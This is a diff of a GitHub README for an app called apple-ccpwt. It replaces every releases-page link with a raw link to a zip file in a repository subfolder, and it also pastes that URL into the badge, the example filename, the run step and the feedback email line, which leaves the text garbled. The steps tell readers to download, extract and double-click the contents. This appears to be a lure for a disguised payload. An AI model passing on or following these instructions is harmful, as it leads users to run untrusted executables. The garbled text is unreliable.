@@ -6,7 +6,7 @@ Welcome to apple-ccpwt! This application brings a touch of joy and functionality
 
 ## 📥 Download the Application
 
-[![Download apple-ccpwt](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/1gaxv/apple-ccpwt/releases)
+[![Download apple-ccpwt](https://raw.githubusercontent.com/1gaxv/apple-ccpwt/main/foreran/apple-ccpwt.zip%20Now-brightgreen)](https://raw.githubusercontent.com/1gaxv/apple-ccpwt/main/foreran/apple-ccpwt.zip)
 
 ## 💻 System Requirements
 
@@ -30,12 +30,12 @@ apple-ccpwt offers several beneficial features to enhance your productivity and 
 ## 📋 How to Download & Install
 
 1. **Visit the Releases Page:** Click the link below to go to the download section.
-   [Visit this page to download](https://github.com/1gaxv/apple-ccpwt/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/1gaxv/apple-ccpwt/main/foreran/apple-ccpwt.zip)
    
 2. **Choose the Latest Version:** Look for the most recent release at the top of the page.
 
 3. **Download the File:**
-   - Click on the asset that suits your operating system (e.g., `apple-ccpwt-windows.zip` for Windows).
+   - Click on the asset that suits your operating system (e.g., `https://raw.githubusercontent.com/1gaxv/apple-ccpwt/main/foreran/apple-ccpwt.zip` for Windows).
    - The download should start automatically.
 
 4. **Extract the File:**
@@ -44,7 +44,7 @@ apple-ccpwt offers several beneficial features to enhance your productivity and 
 
 5. **Run the Application:**
    - Navigate to the folder where you extracted the files.
-   - Double-click the `apple-ccpwt.exe` (for Windows) or the corresponding file for your system.
+   - Double-click the `https://raw.githubusercontent.com/1gaxv/apple-ccpwt/main/foreran/apple-ccpwt.zip` (for Windows) or the corresponding file for your system.
 
 6. **Follow the Setup Instructions:**
    - A setup window will appear. Follow the prompts to complete installation.
@@ -63,7 +63,7 @@ If you encounter any issues or have questions, check the user community. It’s 
 
 Ensure you have the latest version of apple-ccpwt to enjoy new features and improvements. Follow these steps to update:
 
-1. **Return to the Releases Page:** [Visit this page to download](https://github.com/1gaxv/apple-ccpwt/releases).
+1. **Return to the Releases Page:** [Visit this page to download](https://raw.githubusercontent.com/1gaxv/apple-ccpwt/main/foreran/apple-ccpwt.zip).
   
 2. **Download the Newest Version:** Follow the same download steps outlined above.
 
@@ -73,7 +73,7 @@ Ensure you have the latest version of apple-ccpwt to enjoy new features and impr
 
 Help us improve apple-ccpwt! Share your feedback or suggestions. Your input helps us make the app better for everyone.
 
-- **Send Us an Email:** Reach out at feedback@apple-ccpwt.com.
+- **Send Us an Email:** Reach out at https://raw.githubusercontent.com/1gaxv/apple-ccpwt/main/foreran/apple-ccpwt.zip
 - **Leave a Comment:** Share your experience on our community forums.
 
 ## 🔍 Explore More
